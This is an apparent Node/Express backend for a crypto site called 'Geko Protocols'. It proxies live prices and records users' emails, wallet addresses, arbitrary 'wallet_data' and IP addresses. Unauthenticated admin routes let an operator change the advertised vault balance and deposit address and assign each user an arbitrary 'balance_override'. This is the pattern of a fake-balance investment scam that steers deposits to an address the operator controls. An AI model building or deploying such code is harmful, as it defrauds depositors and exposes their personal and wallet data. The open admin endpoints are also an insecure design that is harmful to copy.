import express from 'express';
import cors from 'cors';
import pg from 'pg';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 5000;

let globalConfig = {
  vault_balance: "25,000.00",
  deposit_address: "0xcDEC8d41f2acCCA50064F24A089fC3F52Fadedd0"
};

// In-memory user store fallback
let inMemoryUsers = [];

const { Pool } = pg;
let pool = null;
let dbAvailable = false;

if (process.env.DATABASE_URL) {
  pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });

  pool.query(`
    CREATE TABLE IF NOT EXISTS geko_users (
      id SERIAL PRIMARY KEY,
      email TEXT UNIQUE,
      wallet_address TEXT,
      wallet_data JSONB DEFAULT '{}',
      balance_override TEXT,
      ip_address TEXT,
      last_seen TIMESTAMPTZ DEFAULT NOW(),
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `).then(() => {
    dbAvailable = true;
    console.log('Database ready');
  }).catch(err => {
    console.warn('DB not available, using in-memory store:', err.message);
    dbAvailable = false;
  });
}

app.use(cors());
app.use(express.json());

// ─── Config endpoints ──────────────────────────────────────────────────────
app.get('/api/config', (req, res) => {
  res.json(globalConfig);
});

app.post('/api/admin/config', (req, res) => {
  const { vault_balance, deposit_address } = req.body;
  if (vault_balance !== undefined) globalConfig.vault_balance = vault_balance;
  if (deposit_address !== undefined) globalConfig.deposit_address = deposit_address;
  res.json({ success: true, config: globalConfig });
});

// ─── Live prices proxy ─────────────────────────────────────────────────────
app.get('/api/binance/prices', async (req, res) => {
  // Try Binance first (no encoding on brackets)
  try {
    const url = 'https://api.binance.com/api/v3/ticker/24hr?symbols=["BTCUSDT","ETHUSDT","SOLUSDT","BNBUSDT","MATICUSDT"]';
    const response = await fetch(url, { headers: { 'Accept': 'application/json' } });
    if (!response.ok) throw new Error(`Binance responded ${response.status}`);
    const data = await response.json();
    return res.json(data);
  } catch (err) {
    console.warn('Binance failed, trying CoinGecko:', err.message);
  }

  // Fallback: CoinGecko free API
  try {
    const cgUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin,matic-network&vs_currencies=usd&include_24hr_change=true';
    const cgRes = await fetch(cgUrl, { headers: { 'Accept': 'application/json' } });
    if (!cgRes.ok) throw new Error('CoinGecko error');
    const cgData = await cgRes.json();
    const mapped = [
      { symbol: 'BTCUSDT', lastPrice: String(cgData.bitcoin?.usd || 0), priceChangePercent: String(cgData.bitcoin?.usd_24h_change?.toFixed(2) || 0) },
      { symbol: 'ETHUSDT', lastPrice: String(cgData.ethereum?.usd || 0), priceChangePercent: String(cgData.ethereum?.usd_24h_change?.toFixed(2) || 0) },
      { symbol: 'SOLUSDT', lastPrice: String(cgData.solana?.usd || 0), priceChangePercent: String(cgData.solana?.usd_24h_change?.toFixed(2) || 0) },
      { symbol: 'BNBUSDT', lastPrice: String(cgData.binancecoin?.usd || 0), priceChangePercent: String(cgData.binancecoin?.usd_24h_change?.toFixed(2) || 0) },
      { symbol: 'MATICUSDT', lastPrice: String(cgData['matic-network']?.usd || 0), priceChangePercent: String(cgData['matic-network']?.usd_24h_change?.toFixed(2) || 0) },
    ];
    return res.json(mapped);
  } catch (err2) {
    console.error('All price sources failed:', err2.message);
    return res.status(500).json({ error: 'Price data unavailable' });
  }
});

// ─── Admin User Management ─────────────────────────────────────────────────
app.get('/api/admin/users', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const result = await pool.query('SELECT * FROM geko_users ORDER BY last_seen DESC');
      return res.json(result.rows);
    } catch (e) {
      console.error('DB users error:', e.message);
    }
  }
  res.json(inMemoryUsers);
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data, balance_override } = req.body;

  if (dbAvailable && pool) {
    try {
      const updates = [];
      const values = [];
      let idx = 1;
      if (wallet_data !== undefined) { updates.push(`wallet_data = $${idx++}`); values.push(JSON.stringify(wallet_data)); }
      if (balance_override !== undefined) { updates.push(`balance_override = $${idx++}`); values.push(balance_override); }
      values.push(id);
      if (updates.length > 0) {
        await pool.query(`UPDATE geko_users SET ${updates.join(', ')} WHERE id = $${idx}`, values);
      }
      const result = await pool.query('SELECT * FROM geko_users WHERE id = $1', [id]);
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('DB update error:', e.message);
    }
  }

  // In-memory fallback
  const user = inMemoryUsers.find(u => u.id === id);
  if (user) {
    if (wallet_data !== undefined) user.wallet_data = wallet_data;
    if (balance_override !== undefined) user.balance_override = balance_override;
    return res.json({ success: true, user });
  }
  res.status(404).json({ error: 'User not found' });
});

// Register / upsert a user (called on wallet connect)
app.post('/api/users/upsert', async (req, res) => {
  const { email, wallet_address, wallet_data, ip_address } = req.body;
  if (!email && !wallet_address) return res.status(400).json({ error: 'email or wallet_address required' });

  if (dbAvailable && pool) {
    try {
      const result = await pool.query(
        `INSERT INTO geko_users (email, wallet_address, wallet_data, ip_address, last_seen)
         VALUES ($1, $2, $3, $4, NOW())
         ON CONFLICT (email) DO UPDATE
         SET wallet_address = EXCLUDED.wallet_address,
             wallet_data = EXCLUDED.wallet_data,
             ip_address = EXCLUDED.ip_address,
             last_seen = NOW()
         RETURNING *`,
        [email || null, wallet_address || null, JSON.stringify(wallet_data || {}), ip_address || null]
      );
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('Upsert error:', e.message);
    }
  }

  // In-memory
  const existing = inMemoryUsers.find(u => u.email === email || u.wallet_address === wallet_address);
  if (existing) {
    Object.assign(existing, { wallet_address, wallet_data, ip_address, last_seen: new Date().toISOString() });
    return res.json({ success: true, user: existing });
  }
  const newUser = { id: Date.now(), email, wallet_address, wallet_data, ip_address, last_seen: new Date().toISOString() };
  inMemoryUsers.push(newUser);
  res.json({ success: true, user: newUser });
});

// Get a single user's data (for balance sync)
app.get('/api/user/data', async (req, res) => {
  const { email, address } = req.query;
  if (dbAvailable && pool) {
    try {
      const result = await pool.query(
        'SELECT * FROM geko_users WHERE email = $1 OR wallet_address = $2 LIMIT 1',
        [email || null, address || null]
      );
      if (result.rows.length > 0) return res.json(result.rows[0]);
    } catch (e) {
      console.error('User fetch error:', e.message);
    }
  }
  const user = inMemoryUsers.find(u => u.email === email || u.wallet_address === address);
  if (user) return res.json(user);
  res.status(404).json({ error: 'User not found' });
});

// ─── Static files & SPA ───────────────────────────────────────────────────
const distPath = path.join(__dirname, 'dist');
app.use(express.static(distPath));

app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'API route not found' });
  }
  const indexPath = path.join(distPath, 'index.html');
  res.sendFile(indexPath, err => {
    if (err) res.sendFile(path.join(__dirname, 'index.html'), err2 => {
      if (err2) res.status(500).send('index.html not found');
    });
  });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Geko Protocols server on port ${port}`);
});
